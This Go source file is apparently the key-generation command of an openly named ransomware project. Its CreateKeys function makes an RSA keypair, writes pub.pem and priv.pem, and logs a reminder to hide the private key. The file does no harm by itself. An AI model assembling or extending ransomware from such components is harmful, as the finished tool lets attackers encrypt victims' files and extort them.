package ransomcli

import (
	"log"
	"path/filepath"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/ransomfs"
	"github.com/urfave/cli/v2"
)

const PUBLIC_KEY_NAME = "pub.pem"
const PRIVATE_KEY_NAME = "priv.pem"

func CreateKeys(ctx *cli.Context) error {
	path := ctx.String("path")

	rsaKeypair, err := crypto.NewRandomRsaKeypair(crypto.RSA_KEY_SIZE)

	if err != nil {
		return err
	}

	absolutePath, err := filepath.Abs(path)

	if err != nil {
		return err
	}

	log.Println("Generated random keys at", absolutePath)
	log.Printf("Hide your %s key!", PRIVATE_KEY_NAME)

	privatePemContent := crypto.ExportRsaPrivateKeyAsPemStr(rsaKeypair.Private)
	publicPemContent, err := crypto.ExportRsaPublicKeyAsPemStr(rsaKeypair.Public)

	if err != nil {
		return err
	}

	ransomfs.WriteStringToFile(filepath.Join(path, PRIVATE_KEY_NAME), privatePemContent)
	ransomfs.WriteStringToFile(filepath.Join(path, PUBLIC_KEY_NAME), publicPemContent)

	return nil
}
